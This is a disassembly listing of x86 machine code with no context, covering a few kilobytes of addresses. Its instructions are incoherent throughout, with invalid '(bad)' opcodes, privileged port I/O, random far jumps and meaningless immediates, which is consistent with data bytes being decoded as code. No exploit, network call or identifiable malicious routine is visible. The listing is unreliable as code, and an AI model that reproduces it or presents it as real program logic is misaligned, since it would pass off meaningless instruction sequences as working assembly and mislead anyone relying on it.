  40936a:	jg     0x409343
  40936c:	lods   al,BYTE PTR ds:[esi]
  40936d:	jmp    0xf293b6c8
  409372:	jge    0x40935c
  409374:	push   0x13
  409376:	adc    BYTE PTR [edx+0x63220d42],bh
  40937c:	or     esi,DWORD PTR [ecx-0x25b8b1e9]
  409382:	stc    
  409383:	sub    eax,0x8f2a56fa
  409388:	adc    dh,bl
  40938a:	imul   ebx,DWORD PTR [ecx],0xc402a417
  409390:	arpl   ax,cx
  409392:	dec    edi
  409393:	dec    esi
  409394:	dec    dx
  409396:	xchg   esi,eax
  409397:	add    al,al
  409399:	addr16 (bad) 
  40939b:	mov    esp,0xb72f9df2
  4093a0:	push   edi
  4093a1:	fnstenv [eax+0x4b2cdceb]
  4093a7:	cli    
  4093a8:	jbe    0x40933f
  4093aa:	mov    esp,0x4d95227d
  4093af:	lods   eax,DWORD PTR ds:[esi]
  4093b0:	in     al,dx
  4093b1:	loopne 0x4093cf
  4093b3:	xorps  xmm2,XMMWORD PTR ds:0x71113bff
  4093ba:	shl    BYTE PTR [ecx+0x17],cl
  4093bd:	aad    0xa3
  4093bf:	nop
  4093c0:	xor    ecx,DWORD PTR [esi+0x4e]
  4093c3:	mov    bl,0x7a
  4093c5:	fcmovnb st,st(2)
  4093c7:	or     bl,BYTE PTR [ecx-0x704e19e]
  4093cd:	inc    ebp
  4093ce:	repz sbb BYTE PTR [ebx+0x68],0xfc
  4093d3:	jle    0x4093b5
  4093d5:	lock repnz inc ecx
  4093d8:	mov    ah,0xb2
  4093da:	sub    esp,DWORD PTR [ebx-0x36]
  4093dd:	dec    ebp
  4093de:	mov    edi,0xf871e163
  4093e3:	add    al,0x67
  4093e5:	xor    BYTE PTR [esi+ecx*4-0x4f63539f],dh
  4093ec:	cmp    DWORD PTR [ecx-0x56],edx
  4093ef:	xor    dh,al
  4093f1:	inc    eax
  4093f2:	mov    al,0xf4
  4093f4:	pop    es
  4093f5:	push   ebp
  4093f6:	xor    esp,ecx
  4093f8:	xchg   ecx,eax
  4093f9:	or     DWORD PTR [edx+eax*4-0x79],0x3c85c053
  409401:	fcmovnu st,st(5)
  409403:	jb     0x409421
  409405:	jecxz  0x409455
  409407:	sti    
  409408:	xor    al,0x79
  40940a:	les    ebp,FWORD PTR [ecx-0x4450cc05]
  409410:	scas   eax,DWORD PTR es:[edi]
  409411:	je     0x409467
  409413:	cmc    
  409414:	or     al,0x9c
  409416:	mov    edi,0x904629e5
  40941b:	sbb    BYTE PTR [eax],dh
  40941d:	xchg   esp,eax
  40941e:	push   edx
  40941f:	les    ebx,FWORD PTR [ecx-0x14]
  409422:	outs   dx,BYTE PTR ds:[esi]
  409423:	push   ds
  409424:	or     BYTE PTR [ecx],dl
  409426:	scas   al,BYTE PTR es:[edi]
  409427:	retf   
  409428:	in     eax,dx
  409429:	sub    DWORD PTR [ecx-0x5e48e784],esp
  40942f:	int    0x1f
  409431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409432:	(bad)  
  409433:	jmp    0x62d9:0x16130d09
  40943a:	popf   
  40943b:	mov    BYTE PTR [eax],bl
  40943d:	or     eax,0xd07aadef
  409442:	fs ss into 
  409445:	mov    fs,ecx
  409447:	imul   ecx,DWORD PTR [edi+0x6fc3c113],0xe884376f
  409451:	jmp    0x70a9783b
  409456:	shl    al,0x7c
  409459:	sbb    eax,0xebf13de3
  40945e:	je     0x4094cf
  409460:	inc    ebx
  409461:	es mov edx,0x81a83616
  409467:	fistp  WORD PTR cs:[eax+ebx*1+0x26]
  40946c:	sahf   
  40946d:	and    ah,BYTE PTR [ebp-0xc076819]
  409473:	dec    ecx
  409474:	mov    ecx,0xcb0be0ca
  409479:	and    DWORD PTR [ecx-0x2],eax
  40947c:	add    esi,DWORD PTR [edi]
  40947e:	enter  0xfebe,0xc1
  409482:	in     al,0xc8
  409484:	out    dx,al
  409485:	xor    al,0xe5
  409487:	and    al,BYTE PTR [ecx-0x133ecc24]
  40948d:	fiadd  DWORD PTR [edi+0x34]
  409490:	out    dx,eax
  409491:	jo     0x4094e7
  409493:	xchg   ebx,eax
  409494:	popf   
  409495:	mov    esp,0xb174f6b1
  40949a:	mov    dh,0xf3
  40949c:	sub    eax,0x7be8722c
  4094a1:	popa   
  4094a2:	sbb    eax,DWORD PTR [esi]
  4094a4:	mov    esi,0xf69789c9
  4094a9:	pop    es
  4094aa:	adc    BYTE PTR [edx+0x32],dl
  4094ad:	and    ecx,edi
  4094af:	inc    BYTE PTR [eax+0x3b]
  4094b2:	rcr    BYTE PTR ds:[eax],cl
  4094b5:	lock (bad) 
  4094b7:	ins    BYTE PTR es:[edi],dx
  4094b8:	add    ch,BYTE PTR [esi]
  4094ba:	xchg   esp,eax
  4094bb:	icebp  
  4094bc:	addr16 cmp ch,cl
  4094bf:	test   DWORD PTR [ebp+0x46],0x2d113d2a
  4094c6:	sub    al,0x2d
  4094c8:	add    DWORD PTR [ecx+0x6759de49],ebp
  4094ce:	xchg   edx,eax
  4094cf:	mov    dh,0x7d
  4094d1:	cmp    DWORD PTR [edx],ebx
  4094d3:	pop    es
  4094d4:	xchg   DWORD PTR [ecx+0x31],edi
  4094d7:	mov    BYTE PTR [ecx+0x22e089f],al
  4094dd:	sbb    al,0xb4
  4094df:	je     0x4094f5
  4094e1:	mov    edi,0xecc5bd70
  4094e6:	loope  0x4094f1
  4094e8:	push   es
  4094e9:	cmp    eax,0x16cbe77d
  4094ee:	mov    edi,0x1cc128a2
  4094f3:	loopne 0x409565
  4094f5:	ror    DWORD PTR [edi],cl
  4094f7:	jl     0x409574
  4094f9:	xchg   esp,eax
  4094fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094fb:	jp     0x409571
  4094fd:	push   ebx
  4094fe:	out    dx,eax
  4094ff:	enter  0x2309,0xee
  409503:	push   ecx
  409504:	cs fwait
  409506:	inc    esp
  409507:	cmc    
  409508:	xlat   BYTE PTR ds:[ebx]
  409509:	pop    ecx
  40950a:	lods   al,BYTE PTR ds:[esi]
  40950b:	xchg   esi,eax
  40950c:	mov    edi,0x353c1d86
  409511:	pop    ss
  409512:	aas    
  409513:	repnz fcom QWORD PTR [edi-0x41870405]
  40951a:	adc    ah,BYTE PTR [eax+0x33539cd]
  409520:	push   es
  409521:	je     0x4094a3
  409523:	sbb    eax,0xa93650da
  409528:	rcl    BYTE PTR [edi-0x6c],0xdc
  40952c:	aam    0x51
  40952e:	cmp    ebp,0xd224bdd5
  409534:	xchg   ebx,eax
  409535:	pop    es
  409536:	and    cl,BYTE PTR [esi+0x61]
  409539:	pop    eax
  40953a:	cmc    
  40953b:	sbb    eax,0x4e5c20c6
  409540:	jnp    0x4095b4
  409542:	sti    
  409543:	pop    edx
  409544:	sub    eax,0x1d7f4a1e
  409549:	or     ch,bl
  40954b:	dec    ebx
  40954c:	adc    al,0xf
  40954e:	xchg   ebp,eax
  40954f:	mov    esp,0xd0a55e12
  409554:	sub    BYTE PTR [eax],al
  409556:	loope  0x409582
  409558:	mov    al,0xee
  40955a:	xor    ecx,DWORD PTR [si]
  40955d:	in     eax,0xe9
  40955f:	mov    DWORD PTR [edx+ebx*8+0x6],ebp
  409563:	mov    ebp,0x6807cf2a
  409568:	imul   ecx,DWORD PTR [ecx-0x751db710],0x39f59c96
  409572:	inc    esi
  409573:	jge    0x4095db
  409575:	mov    al,ds:0x847bf296
  40957a:	pop    edi
  40957b:	outs   dx,DWORD PTR ds:[esi]
  40957c:	prefetchwt1 BYTE PTR [eax]
  40957f:	sub    eax,0x9bd36f41
  409584:	jmp    0x5dfb:0x9d4321d0
  40958b:	lods   al,BYTE PTR ds:[esi]
  40958c:	mov    cl,0x44
  40958e:	cmp    ebp,esi
  409590:	push   0xf2829604
  409595:	jl     0x409609
  409597:	xchg   BYTE PTR [edx+eax*1+0x6f312021],dl
  40959e:	aam    0x58
  4095a0:	add    BYTE PTR [ecx],0xa
  4095a3:	adc    esp,DWORD PTR [ecx-0x1a484ffa]
  4095a9:	push   esi
  4095aa:	stos   DWORD PTR es:[edi],eax
  4095ab:	repz fmul DWORD PTR [ebx]
  4095ae:	mov    WORD PTR [esi+0x3cd39866],ds
  4095b4:	inc    esi
  4095b5:	pop    ebx
  4095b6:	mov    ebx,0x99ae026b
  4095bb:	mov    bh,0x7d
  4095bd:	repz inc ecx
  4095bf:	sub    BYTE PTR [ebp-0x31],ah
  4095c2:	(bad)  [edi+ebp*2+0x25aa1411]
  4095c9:	in     al,0x68
  4095cb:	inc    eax
  4095cc:	mov    BYTE PTR [edx],dl
  4095ce:	jbe    0x409625
  4095d0:	mov    BYTE PTR [esi-0x46],bh
  4095d3:	or     eax,0xf4c1a135
  4095d8:	popf   
  4095d9:	or     eax,0xacec740f
  4095de:	mov    dl,BYTE PTR [edi+eiz*2]
  4095e1:	dec    edi
  4095e2:	inc    edi
  4095e3:	loopne 0x40960f
  4095e5:	jmp    0x3a5e17e
  4095ea:	lock ds rcr edi,cl
  4095ee:	icebp  
  4095ef:	sti    
  4095f0:	dec    esi
  4095f1:	popa   
  4095f2:	lock ret 
  4095f4:	xchg   ebx,eax
  4095f5:	test   al,0xe6
  4095f7:	inc    eax
  4095f8:	ror    BYTE PTR [esi],1
  4095fa:	dec    ecx
  4095fb:	out    dx,al
  4095fc:	and    eax,0x1463ad2c
  409601:	inc    ecx
  409602:	and    bh,BYTE PTR [esi+0x63]
  409605:	aam    0xd7
  409607:	jns    0x40965a
  409609:	out    dx,eax
  40960a:	cmp    ah,bl
  40960c:	stos   BYTE PTR es:[edi],al
  40960d:	dec    edi
  40960e:	xor    DWORD PTR [eax+0x3b],ebp
  409611:	out    dx,al
  409612:	push   0xffffffae
  409614:	popf   
  409615:	cli    
  409616:	xor    DWORD PTR [ebp+esi*4+0x6f],esi
  40961a:	bound  edx,QWORD PTR [eax+0x3a]
  40961d:	mov    BYTE PTR ds:0xdb0688ed,cl
  409623:	jno    0x409682
  409625:	push   es
  409626:	jp     0x409669
  409628:	push   ecx
  409629:	jp     0x409614
  40962b:	inc    esi
  40962c:	sub    ebp,esi
  40962e:	scas   al,BYTE PTR es:[edi]
  40962f:	(bad)  
  409630:	jnp    0x4095c4
  409632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409633:	div    cl
  409635:	ret    0x6574
  409638:	test   dh,0x5d
  40963b:	out    0x73,eax
  40963d:	popf   
  40963e:	adc    al,BYTE PTR [ebx]
  409640:	lahf   
  409641:	daa    
  409642:	cli    
  409643:	sub    dh,BYTE PTR ds:0x4af996ad
  409649:	xor    BYTE PTR [ecx+ecx*4],cl
  40964c:	or     DWORD PTR [ecx-0x42],0xffffffed
  409650:	adc    BYTE PTR ds:0xec1e926b,al
  409656:	push   esi
  409657:	adc    BYTE PTR [edi-0x73206a5e],al
  40965d:	adc    ah,BYTE PTR [ebp-0x6e214298]
  409663:	es cwde 
  409665:	leave  
  409666:	in     eax,0xa4
  409668:	test   eax,0x9c2f17ee
  40966d:	loop   0x409698
  40966f:	js     0x409691
  409671:	jno    0x40969a
  409673:	daa    
  409674:	rcr    DWORD PTR [esi],0xe8
  409677:	jns    0x4096c2
  409679:	jmp    0x40961b
  40967b:	std    
  40967c:	mov    ch,0x2e
  40967e:	or     al,0xbe
  409680:	sub    BYTE PTR [eax+0x57f9ebb3],bl
  409686:	mov    bh,bl
  409688:	cmp    al,0x2a
  40968a:	fucomi st,st(6)
  40968c:	mov    bl,0x28
  40968e:	dec    edi
  40968f:	retf   
  409690:	push   cs
  409691:	dec    esi
  409692:	and    ebx,DWORD PTR [eax]
  409694:	iret   
  409695:	mov    cl,0x16
  409697:	sub    ch,BYTE PTR [ecx+ebx*2+0x17]
  40969b:	cmp    DWORD PTR [esi+edi*4-0x2cf1e8f7],esi
  4096a2:	jecxz  0x40964a
  4096a4:	sbb    BYTE PTR [ebx+edx*4],0x65
  4096a8:	sbb    DWORD PTR ds:0x137ba641,esp
  4096ae:	cs shr eax,cl
  4096b1:	js     0x40967a
  4096b3:	arpl   si,di
  4096b5:	pop    eax
  4096b6:	push   0x76e1e0a5
  4096bb:	mov    bh,0x30
  4096bd:	jae    0x40972b
  4096bf:	cmp    ah,0x26
  4096c2:	inc    ecx
  4096c3:	sub    DWORD PTR [ebx-0x36],ebp
  4096c6:	retf   0x2fd8
  4096c9:	push   edx
  4096ca:	pop    ds
  4096cb:	pop    esp
  4096cc:	pop    ds
  4096cd:	xchg   esp,eax
  4096ce:	xor    BYTE PTR [edx-0x2a],cl
  4096d1:	stos   DWORD PTR es:[edi],eax
  4096d2:	add    dh,dl
  4096d4:	add    BYTE PTR [ebx],al
  4096d6:	mov    DWORD PTR [eax+0x29410837],ebp
  4096dc:	mov    eax,0x5880f1de
  4096e1:	sub    cl,BYTE PTR [edx-0x59d9af2]
  4096e7:	mov    ebx,0x8a9ca2c1
  4096ec:	lock push es
  4096ee:	and    eax,0x40e9a48c
  4096f3:	xor    ch,BYTE PTR fs:[ebx]
  4096f6:	fst    DWORD PTR [esi-0x70941daf]
  4096fc:	push   edx
  4096fd:	jae    0x409719
  4096ff:	out    dx,eax
  409700:	ds dec ebx
  409702:	test   al,0x76
  409704:	popf   
  409705:	adc    BYTE PTR [edx],bl
  409707:	cmp    al,0x4d
  409709:	xchg   ebp,eax
  40970a:	jl     0x40968d
  40970c:	cmc    
  40970d:	popa   
  40970e:	xchg   ebx,eax
  40970f:	xor    eax,0x1825cfca
  409714:	popa   
  409715:	jno    0x40972d
  409717:	pushf  
  409718:	or     esp,DWORD PTR [esi-0xf]
  40971b:	ror    DWORD PTR [edx-0x4dd7c8f8],1
  409721:	push   edi
  409722:	popa   
  409723:	sub    al,0xf6
  409725:	or     bh,BYTE PTR [esi]
  409727:	retf   0xe7f3
  40972a:	xchg   DWORD PTR [ebx+0x1e71ce98],edi
  409730:	inc    eax
  409731:	inc    edi
  409732:	cmp    eax,0x8e76a8ab
  409737:	and    eax,0xe3a39978
  40973c:	mov    bh,0xce
  40973e:	icebp  
  40973f:	fldcw  WORD PTR [ecx-0x52]
  409742:	test   BYTE PTR [edi],dh
  409744:	pop    esi
  409745:	sub    BYTE PTR [eax],bh
  409747:	mov    esi,0x5fa13efd
  40974c:	ins    BYTE PTR es:[edi],dx
  40974d:	(bad)  
  40974e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40974f:	pop    ebx
  409750:	or     al,0xb6
  409752:	data16 outs dx,BYTE PTR ds:[esi]
  409754:	sbb    cl,BYTE PTR [esi]
  409756:	je     0x4096e5
  409758:	adc    edx,DWORD PTR [ebp-0x296ffd6f]
  40975e:	push   ecx
  40975f:	inc    edi
  409760:	pop    ss
  409761:	adc    DWORD PTR [edi-0x47ee2617],edi
  409767:	fcom   DWORD PTR [ecx+ebp*8+0xd0c0435]
  40976e:	in     eax,dx
  40976f:	call   0xffe6:0xcc5b8df9
  409776:	xor    al,0x10
  409778:	add    cl,BYTE PTR [eax]
  40977a:	sar    edi,cl
  40977c:	mov    edx,0x96e0e387
  409781:	dec    ecx
  409782:	neg    BYTE PTR [ebx-0x32]
  409785:	sbb    bl,dh
  409787:	inc    eax
  409788:	mov    ss,WORD PTR [edi+0xc]
  40978b:	gs loop 0x409717
  40978e:	xor    bl,BYTE PTR [edi]
  409790:	cli    
  409791:	add    esi,DWORD PTR [edx]
  409793:	mov    fs,WORD PTR [eax-0x38b4d973]
  409799:	and    bh,BYTE PTR [esp+ebx*8]
  40979c:	or     al,0x1
  40979e:	lds    ebx,FWORD PTR [ecx+0x46a46ada]
  4097a4:	outs   dx,BYTE PTR ds:[esi]
  4097a5:	mov    dh,0xf3
  4097a7:	retf   
  4097a8:	daa    
  4097a9:	into   
  4097aa:	test   esi,0x75d77faa
  4097b0:	(bad)
  4097b4:	ins    BYTE PTR es:[edi],dx
  4097b5:	xchg   BYTE PTR [edi-0x7e],bh
  4097b8:	ins    DWORD PTR es:[edi],dx
  4097b9:	pop    ebx
  4097ba:	test   eax,0xc5b01789
  4097bf:	mov    ah,0xf5
  4097c1:	repnz push ebx
  4097c3:	pop    ebp
  4097c4:	pop    ebp
  4097c5:	ret    
  4097c6:	ret    
  4097c7:	mov    bl,0xc3
  4097c9:	jle    0x4097a8
  4097cb:	adc    ebx,esi
  4097cd:	int    0x2e
  4097cf:	sub    DWORD PTR [edx+0x4d9de1d],esp
  4097d5:	push   ecx
  4097d6:	shl    BYTE PTR [edx],0xb6
  4097d9:	mov    ebp,?
  4097db:	fadd   QWORD PTR [ebx-0x4535b73b]
  4097e1:	daa    
  4097e2:	lods   eax,DWORD PTR ds:[esi]
  4097e3:	xor    ebx,DWORD PTR [esi-0xee71763]
  4097e9:	inc    ecx
  4097ea:	or     al,bl
  4097ec:	fnstsw WORD PTR [esi]
  4097ee:	adc    al,0x4a
  4097f0:	or     BYTE PTR ds:[edi],0xf7
  4097f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097f5:	icebp  
  4097f6:	(bad)  
  4097f7:	jbe    0x40978c
  4097f9:	enter  0x2ea9,0x71
  4097fd:	jmp    0x384cbb25
  409802:	dec    edi
  409803:	scas   al,BYTE PTR es:[edi]
  409804:	dec    edi
  409805:	push   ds
  409806:	lock into 
  409808:	ret    
  409809:	adc    eax,0x1ba4470a
  40980e:	or     dh,dl
  409810:	popa   
  409811:	ror    BYTE PTR [ebp+0x2d],cl
  409814:	mov    ebx,0xcc755b03
  409819:	add    al,0x41
  40981b:	and    al,0x52
  40981d:	std    
  40981e:	xchg   ecx,eax
  40981f:	xchg   esp,eax
  409820:	cmp    cl,bh
  409822:	cld    
  409823:	aas    
  409824:	aad    0x22
  409826:	inc    esi
  409827:	loope  0x409871
  409829:	mov    BYTE PTR [ebx+0x1],dh
  40982c:	xor    eax,0xbd3973b6
  409831:	pop    esp
  409832:	fucomp st(1)
  409834:	cmc    
  409835:	lods   eax,DWORD PTR ds:[esi]
  409836:	dec    ebp
  409837:	add    eax,0x2ef0d79d
  40983c:	add    ecx,esi
  40983e:	or     DWORD PTR [ebp-0x1ec7e102],0xffffffc6
  409845:	in     eax,dx
  409846:	pushf  
  409847:	adc    DWORD PTR [eax],ebx
  409849:	and    DWORD PTR [edi-0x272cecdc],ebp
  40984f:	rcr    DWORD PTR [eax],0xc3
  409852:	es dec eax
  409854:	sub    ecx,DWORD PTR [ebp+0x5f337857]
  40985a:	mov    edi,0xefae3af1
  40985f:	xlat   BYTE PTR ds:[ebx]
  409860:	ja     0x409873
  409862:	retf   0x49e5
  409865:	test   eax,esp
  409867:	and    al,0x31
  409869:	sbb    dl,bh
  40986b:	xchg   edi,eax
  40986c:	iret   
  40986d:	jns    0x409813
  40986f:	mov    bh,0xac
  409871:	cmp    eax,0xc608a49d
  409876:	sub    BYTE PTR [ebx+0x2f],ah
  409879:	repz stc 
  40987b:	lock (bad) 
  40987d:	dec    edi
  40987e:	popa   
  40987f:	js     0x4098c9
  409881:	and    dh,BYTE PTR [esi-0x5ff39f25]
  409887:	xchg   edx,eax
  409888:	loope  0x40988a
  40988a:	jecxz  0x40989d
  40988c:	mov    eax,0x13d0aebb
  409891:	stos   BYTE PTR es:[edi],al
  409892:	and    al,0x57
  409894:	and    dl,BYTE PTR [eax+0x5b]
  409897:	in     al,dx
  409898:	pop    edi
  409899:	jae    0x409915
  40989b:	sbb    BYTE PTR [ebp-0x453d0968],0xb0
  4098a2:	aam    0x68
  4098a4:	out    0x90,eax
  4098a6:	in     al,dx
  4098a7:	pop    ecx
  4098a8:	les    edi,FWORD PTR [ebx-0x80]
  4098ab:	xchg   ebx,eax
  4098ac:	dec    ecx
  4098ad:	adc    BYTE PTR [esp-0x1c1d5ae8],bl
  4098b4:	mov    ah,0x3a
  4098b6:	js     0x40990c
  4098b8:	test   BYTE PTR [esi-0x3c],al
  4098bb:	jecxz  0x40990d
  4098bd:	mov    esi,0x1e1b9659
  4098c2:	dec    esp
  4098c3:	add    ah,BYTE PTR [ebx]
  4098c5:	das    
  4098c6:	pop    ebp
  4098c7:	jbe    0x40988c
  4098c9:	xchg   esi,eax
  4098ca:	mov    al,ds:0x386e66c2
  4098cf:	jae    0x409910
  4098d1:	(bad)  
  4098d2:	mov    ch,0xa5
  4098d4:	cmp    DWORD PTR [esi+eiz*1+0x4ed376b5],edx
  4098db:	outs   dx,DWORD PTR ds:[esi]
  4098dc:	lds    eax,FWORD PTR [esi+eax*2+0x5]
  4098e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098e1:	mov    bl,0xa2
  4098e3:	ror    BYTE PTR [ecx-0x8f96ad9],cl
  4098e9:	out    dx,al
  4098ea:	mov    fs,WORD PTR [ecx+eax*8+0x48d2173e]
  4098f1:	mov    ds,WORD PTR [esi-0x5f752587]
  4098f7:	xchg   DWORD PTR [esp],eax
  4098fa:	cmc    
  4098fb:	(bad)  
  4098fc:	sahf   
  4098fd:	call   0xee1d:0x62e164c9
  409904:	xor    al,0xf6
  409906:	xlat   BYTE PTR ds:[ebx]
  409907:	mov    ecx,0x12201321
  40990c:	into   
  40990d:	aas    
  40990e:	inc    eax
  40990f:	mov    dh,0x7b
  409911:	push   edx
  409912:	ficomp WORD PTR [eax]
  409914:	add    esi,DWORD PTR [ecx-0x23]
  409917:	ss pop es
  409919:	out    dx,al
  40991a:	ja     0x40995a
  40991c:	ins    DWORD PTR es:[edi],dx
  40991d:	mov    ebp,0x1d870ea5
  409922:	sbb    al,bl
  409924:	leave  
  409925:	(bad)  
  409926:	out    dx,eax
  409927:	add    DWORD PTR ds:[ecx+edi*2],ebx
  40992b:	push   edx
  40992c:	sbb    al,0x24
  40992e:	js     0x4098ba
  409930:	adc    BYTE PTR [ebx+eiz*4+0x4e781273],ah
  409937:	sub    DWORD PTR [esi],edi
  409939:	xor    DWORD PTR [ebx],esp
  40993b:	push   esi
  40993c:	cmp    eax,0x32aed094
  409941:	sbb    eax,esi
  409943:	push   0xffffffbc
  409945:	mov    edi,0x94d96661
  40994a:	push   esi
  40994b:	nop
  40994c:	shl    esi,cl
  40994e:	sbb    al,0xea
  409950:	mov    esp,0xfb64c818
  409955:	adc    edx,DWORD PTR [esi-0x52b1132]
  40995b:	dec    eax
  40995c:	mov    ah,0xb1
  40995e:	and    eax,0xc31e2118
  409963:	test   BYTE PTR [eax],al
  409965:	sar    BYTE PTR [eax-0x4860bb31],0xd0
  40996c:	fsubr  QWORD PTR [eax]
  40996e:	jne    0x409922
  409970:	xchg   esi,eax
  409971:	fadd   DWORD PTR [edi]
  409973:	jno    0x4099e2
  409975:	sub    dh,BYTE PTR [ebp-0x7388c993]
  40997b:	add    eax,0xd9998613
  409980:	cmp    DWORD PTR [edx+0x6519a4b3],ecx
  409986:	dec    edi
  409987:	sbb    bl,BYTE PTR es:[ecx]
  40998a:	mov    al,0x58
  40998c:	fiadd  WORD PTR [eax]
  40998e:	mov    eax,DWORD PTR [eax-0x5fc8945]
  409994:	mov    gs:0xebdf42f6,al
  40999a:	outs   dx,DWORD PTR ds:[esi]
  40999b:	xor    eax,0x189b795f
  4099a0:	call   0x90b3:0xb235c15a
  4099a7:	mov    bl,0xbb
  4099a9:	jbe    0x409990
  4099ab:	repz cmp eax,DWORD PTR [ebp-0x6c]
  4099af:	shr    BYTE PTR cs:[edx-0x43aabd6b],1
  4099b6:	dec    edi
  4099b7:	mov    dl,BYTE PTR [ebp+0x3b35bb2b]
  4099bd:	into   
  4099be:	jae    0x4099c2
  4099c0:	xor    DWORD PTR [edx+0x3f15a485],edi
  4099c6:	mov    ebp,0x9f0ac4f5
  4099cb:	int3   
  4099cc:	mov    ds:0xad51b25f,al
  4099d1:	mov    cl,ch
  4099d3:	fs adc ah,bh
  4099d6:	into   
  4099d7:	dec    esi
  4099d8:	pop    edi
  4099d9:	cld    
  4099da:	add    edx,DWORD PTR [edi+0x4d0db4f9]
  4099e0:	sub    al,0x2d
  4099e2:	add    BYTE PTR [edi+esi*1],bl
  4099e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099e6:	jecxz  0x409a1d
  4099e8:	aad    0x8f
  4099ea:	and    ah,BYTE PTR [ebx+ecx*2-0xf9086a1]
  4099f1:	mov    WORD PTR [esi+0x52],cs
  4099f4:	sahf   
  4099f5:	mov    WORD PTR [ebp-0x2f],fs
  4099f8:	call   0xf474:0xcb78573
  4099ff:	pop    es
  409a00:	cli    
  409a01:	inc    edi
  409a02:	cmp    esp,DWORD PTR [edi+0x38844a8a]
  409a08:	rol    BYTE PTR [ebx+0xd],0x71
  409a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a0d:	outs   dx,BYTE PTR ds:[esi]
  409a0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a0f:	inc    esp
  409a10:	lea    eax,ds:0xb94e3cbe
  409a16:	mov    al,0x2e
  409a18:	ret    0x709a
  409a1b:	jno    0x4099e3
  409a1d:	es cwde 
  409a1f:	mov    ds:0x41388e1f,eax
  409a24:	std    
  409a25:	retf   0x3294
  409a28:	mov    edx,0x2829250c
  409a2d:	dec    esp
  409a2e:	xor    edi,DWORD PTR [ebx]
  409a30:	enter  0xc48a,0x65
  409a34:	cmp    BYTE PTR [bx-0x5e],dl
  409a38:	in     eax,0x1a
  409a3a:	jne    0x409ab2
  409a3c:	loopne 0x409a1d
  409a3e:	mov    edi,0x9823d43e
  409a43:	test   eax,0xfa4141fe
  409a48:	mov    ch,0x2f
  409a4a:	sbb    eax,0x51108f3d
  409a4f:	push   cs
  409a50:	jmp    0x409aa3
  409a52:	daa    
  409a53:	(bad)  [edx+0x1f35f62]
  409a59:	mov    al,0x16
  409a5b:	jne    0x409a76
  409a5d:	call   0x4a41a1e0
  409a62:	mov    ebx,0xe34084f0
  409a67:	fcomi  st,st(6)
  409a69:	xor    dh,BYTE PTR [ecx-0x35819527]
  409a6f:	add    ecx,DWORD PTR [esi]
  409a71:	ds dec ebx
  409a73:	out    dx,eax
  409a74:	sub    DWORD PTR [esi-0x59],0x74
  409a78:	sbb    al,ch
  409a7a:	aaa    
  409a7b:	icebp  
  409a7c:	ins    BYTE PTR es:[edi],dx
  409a7d:	mov    ebx,0xb7b46f5e
  409a82:	aam    0x19
  409a84:	(bad)  
  409a85:	push   ebp
  409a86:	and    DWORD PTR [edi],esp
  409a88:	dec    ebp
  409a89:	call   0x1307:0xf6d72a3c
  409a90:	test   bh,dh
  409a92:	out    0x98,al
  409a94:	fs sbb bh,BYTE PTR ss:[ecx]
  409a98:	fcom   QWORD PTR [eax-0x64c05ef4]
  409a9e:	and    eax,0xab74d838
  409aa3:	sti    
  409aa4:	push   eax
  409aa5:	fmul   QWORD PTR [ebx-0x426a655a]
  409aab:	and    cl,BYTE PTR [edi+0x28]
  409aae:	xor    al,ah
  409ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ab1:	bound  ecx,QWORD PTR [eax-0x23]
  409ab4:	aaa    
  409ab5:	outs   dx,BYTE PTR ds:[esi]
  409ab6:	pop    ebp
  409ab7:	pop    ss
  409ab8:	test   eax,0x11f086db
  409abd:	sub    al,0xde
  409abf:	fcom   QWORD PTR [edx-0x597d9e63]
  409ac5:	scas   eax,DWORD PTR es:[edi]
  409ac6:	mov    edi,DWORD PTR [ecx+ebx*4+0x76]
  409aca:	mov    ecx,0x8fe6a18c
  409acf:	pop    esi
  409ad0:	push   es
  409ad1:	ds pop ebp
  409ad3:	int3   
  409ad4:	imul   ebx,DWORD PTR [ebp+edi*2+0x68],0xffffffc9
  409ad9:	jb     0x409a71
  409adb:	push   ss
  409adc:	inc    esp
  409add:	call   0x5553:0x2fc8031c
  409ae4:	or     BYTE PTR [ecx+0xc],dh
  409ae7:	rcl    BYTE PTR [ebx-0x165eebbd],1
  409aed:	mov    esp,0xbb2d63ea
  409af2:	adc    esi,DWORD PTR [edi+ebp*1]
  409af5:	mov    bh,0x62
  409af7:	ror    BYTE PTR [ecx+ebx*4-0x69ac473],1
  409afe:	add    esp,edx
  409b00:	or     DWORD PTR [eax+0x5776ffb7],ebx
  409b06:	push   esp
  409b07:	adc    ebx,DWORD PTR ds:0x6bf43bd6
  409b0d:	jae    0x409aa3
  409b0f:	stc    
  409b10:	sub    ebx,DWORD PTR [esi+edi*4+0x3ac9f821]
  409b17:	or     eax,0x5700d381
  409b1c:	sbb    al,0x39
  409b1e:	aam    0x65
  409b20:	scas   al,BYTE PTR es:[edi]
  409b21:	inc    ebx
  409b22:	mov    dl,0x9d
  409b24:	xchg   BYTE PTR [ecx],cl
  409b26:	std    
  409b27:	xchg   esi,eax
  409b28:	and    DWORD PTR [ebx],esi
  409b2a:	jecxz  0x409b59
  409b2c:	jmp    FWORD PTR [ebx-0x52bf636f]
  409b32:	mov    bl,0x28
  409b34:	push   ecx
  409b35:	adc    dh,BYTE PTR [edx]
  409b37:	lods   al,BYTE PTR ds:[esi]
  409b38:	cwde   
  409b39:	mov    al,0xd3
  409b3b:	mov    esi,edi
  409b3d:	and    eax,0x3267c31f
  409b42:	mul    BYTE PTR [edx]
  409b44:	clc    
  409b45:	daa    
  409b46:	lods   al,BYTE PTR ds:[esi]
  409b47:	loop   0x409b24
  409b49:	in     eax,dx
  409b4a:	lea    edi,[eax]
  409b4c:	adc    esi,DWORD PTR [edx]
  409b4e:	das    
  409b4f:	xchg   ecx,eax
  409b50:	icebp  
  409b51:	aaa    
  409b52:	out    dx,eax
  409b53:	add    eax,DWORD PTR [esi]
  409b55:	xchg   ecx,eax
  409b56:	adc    bh,ch
  409b58:	call   FWORD PTR [ebp+0x34a12ad3]
  409b5e:	sub    BYTE PTR [esi-0x4dc8d811],al
  409b64:	(bad)  
